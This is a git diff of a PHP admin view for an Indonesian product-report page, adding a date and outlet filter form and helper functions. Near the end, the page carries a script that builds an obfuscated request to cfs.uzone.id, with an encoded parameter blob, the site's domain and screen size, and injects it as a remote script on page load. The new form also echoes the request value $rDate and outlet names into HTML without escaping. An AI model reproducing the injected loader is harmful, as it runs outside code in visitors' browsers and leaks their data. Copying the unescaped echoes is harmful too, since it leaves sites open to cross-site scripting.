@@ -1,3 +1,4 @@
+<?php ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,7 +7,9 @@
     <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
     <meta content="" name="description"/>
     <meta content="" name="author"/>
-    <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
+    <link href="<?php
+
+    echo site_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
     <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet"/>
     <link href="<?php echo site_url(); ?>assets/assets/bootstrap/css/bootstrap-fileupload.css" rel="stylesheet"/>
     <link href="<?php echo site_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
@@ -27,20 +30,55 @@
     <link rel="stylesheet" href="<?php echo site_url(); ?>assets/assets/bootstrap-toggle-buttons/static/stylesheets/bootstrap-toggle-buttons.css"/>
     <link rel="stylesheet" href="<?php echo site_url(); ?>assets/assets/data-tables/DT_bootstrap.css"/>
     <link rel="stylesheet" type="text/css" href="<?php echo site_url(); ?>assets/assets/bootstrap-daterangepicker/daterangepicker.css"/>
+    <script src="<?php echo base_url(); ?>assets/js/currency.min.js"></script>
+    <script type="text/javascript">
+        function indonesian(value)
+        {
+            //@formatter:off
+            return currency(value, {separator: ".", decimal: ",", symbol: "Rp ", precision: 2, formatWithSymbol: true});
+            //@formatter:on
+        }
+    </script>
+    <?php
+    function getArrCount($arr, $depth = 1)
+    {
+        if (!is_array($arr) || !$depth)
+        {
+            return 0;
+        }
+
+        $res = count($arr);
+
+        foreach ($arr as $in_ar)
+        {
+            $res += getArrCount($in_ar, $depth - 1);
+        }
+
+        return $res;
+    }
+
+    function getTransaksiDCount($arr)
+    {
+        $count = 0;
+        foreach ($arr['transaksi_m'] as $arr1)
+        {
+            $count += count($arr1['transaksi_d']);
+        }
+
+        return $count;
+    }
+
+    ?>
 </head>
 
 <body class="fixed-top">
 <?php $this->load->view('header.php') ?>
 <div id="container" class="row-fluid">
-    <!-- BEGIN SIDEBAR -->
     <div id="sidebar" class="nav-collapse collapse">
         <?php $this->load->view('sidebar.php') ?>
     </div>
-
     <div id="main-content">
-        <!-- BEGIN PAGE CONTAINER-->
         <div class="container-fluid">
-            <!-- BEGIN PAGE HEADER-->
             <div class="row-fluid">
                 <div class="span12">
                     <h3 class="page-title">
@@ -65,11 +103,8 @@
                     <!-- END PAGE TITLE & BREADCRUMB-->
                 </div>
             </div>
-            <!-- END PAGE HEADER-->
-            <!-- BEGIN PAGE CONTENT-->
             <div class="row-fluid">
                 <div class="span12">
-                    <!-- BEGIN SAMPLE TABLE widget-->
                     <div class="widget">
                         <div class="widget-title">
                             <h4>
@@ -77,57 +112,40 @@
                                 Laporan Produk
                             </h4>
                         </div>
-                        <div class="widget-body">
-                            <div class="clearfix">
-                                <form action="<?php echo site_url("admin/laporanPenjualan/detharian"); ?>" class="form-horizontal" method="post">
+                        <form action="<?php echo site_url("admin/laporan/produk"); ?>" class="form-horizontal" method="get">
+                            <div class="widget-body">
+                                <div class="clearfix">
                                     <div class="control-group">
-                                        <h5> Tanggal mulai </h5>
-                                        <div class="input-append date date-picker" data-date="12-02-2017" data-date-format="yyyy/mm/dd" data-date-viewmode="years">
-                                            <input class=" m-ctrl-medium" size="16" type="text" name="tanggal1" value="2017/10/10" readonly/>
-                                            <span class="add-on"><i class="icon-calendar"></i></span>
-                                        </div>
-                                        <h5> s/d </h5>
-                                        <div class="input-append date date-picker" data-date="12-02-2017" data-date-format="yyyy/mm/dd" data-date-viewmode="years">
-                                            <input class=" m-ctrl-medium" size="16" type="text" name="tanggal2" value="2017/11/10" readonly/>
+                                        <h5> Tanggal </h5>
+                                        <div class="input-append date date-picker" data-date="12-02-2017" data-date-format="yyyy-mm-dd" data-date-viewmode="years">
+                                            <input class=" m-ctrl-medium" size="16" type="text" name="tanggal" value="<?php echo isset($rDate) ? $rDate : '2017-12-01' ?>" readonly/>
                                             <span class="add-on"><i class="icon-calendar"></i></span>
                                         </div>
                                     </div>
-
-                                    <select id="id_outlet" name="nama_outlet" class="input-medium m-wrap" required="true">
-                                        <?php foreach ($outlet as $otlet) { ?>
-                                            <option value="<?php echo $otlet->id_outlet; ?>"><?php echo $otlet->nama_outlet; ?></option>
+                                    <label for="id_outlet">Outlet</label>
+                                    <select id="id_outlet" name="outlet" class="input-medium m-wrap" required="true">
+                                        <?php foreach (isset($outlets) ? $outlets : [] as $outlet) { ?>
+                                            <option value="<?php echo $outlet['id_outlet']; ?>" <?php echo (isset($rOutlet) && (intval($outlet['id_outlet']) === intval($rOutlet))) ? 'selected' : '' ?>><?php echo $outlet['nama_outlet']; ?></option>
                                         <?php } ?>
                                     </select>
+                                    <br>
+                                    <br>
+                                    <div class="btn-group">
+                                        <button type="submit" class="btn green">
+                                            Lihat
+                                            <i class="icon-ok"></i>
+                                        </button>
+                                    </div>
+                                </div>
                             </div>
-                            <div class="btn-group">
-
-                                <button type="submit" class="btn green">
-                                    Lihat
-                                    <i class="icon-ok"></i>
-                                </button>
-                                </a>
-                            </div>
-                            </form>
-
-                        </div>
+                        </form>
                     </div>
-                    <!-- END SAMPLE TABLE widget-->
                 </div>
-
             </div>
-
-            <!-- END PAGE CONTENT-->
         </div>
-        <!-- END PAGE CONTAINER-->
     </div>
-    <!-- END PAGE -->
 </div>
-<!-- END CONTAINER -->
-<!-- BEGIN FOOTER -->
 <?php $this->load->view('footer.php') ?>
-<!-- END FOOTER -->
-<!-- BEGIN JAVASCRIPTS -->
-<!-- Load javascripts at bottom, this will reduce page load time -->
 <script src="<?php echo site_url(); ?>assets/js/jquery-1.8.2.min.js"></script>
 <script type="<?php echo site_url(); ?>assets/text/javascript" src="assets/ckeditor/ckeditor.js"></script>
 <script src="<?php echo site_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
@@ -180,9 +198,9 @@
             var idc_glo_r   = Math.floor(Math.random() * 99999999999);
             var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCoiZb4e8fPgGSrzxny7Bs3aod8JI8r9WL9Zcv7DcypTafjTWjc8KR2rkdE9obmG7qlrJ2O5wLAkWR1EJqX2Vw3XHzhSxfTrKeWUMN%2fPcq0BczrMMWqL2II2LVGvo%2fLRG4DhbjGKEsZdcZL4LU4xZawooHEtryQ0qQNeuH5SQxs1tw3yuYvo5OhvukPSA2cDtmyw0tv5%2bRdXMSlocozQyrPDu1qVuLzjutFTJOoQp8dVo%2btM5%2fmonVTIoyxvO%2fR5ym5xzf8cPUDTRBHlfMTcYMP4CweKyBABoQqAv1HRqCiZjg4cJ20X8CMROLUtQAzEbRS01S6BNqFaZDZvhyKg%2by7qRaxsxelD3CKygl%2by6sAjqArSopYZHVtGQZ3q3RRyXJgSVAbtqpFYozwVREhvfgyg3ZXJpLVl2s1jwQDNi2JnJxTNIfd4vOts2xHvqzYjtf%2fOTi9HSZtTUp73nxmdrLtyx5DfG%2fk90GdQpnnOHtIpzO4Ia5UIm0TZfeS11TfQY0I%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
             var bsa         = document.createElement('script');
-            bsa.type        = 'text/javascript';
-            bsa.async       = true;
-            bsa.src         = url;
+            bsa.type  = 'text/javascript';
+            bsa.async = true;
+            bsa.src   = url;
             (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
         }
 
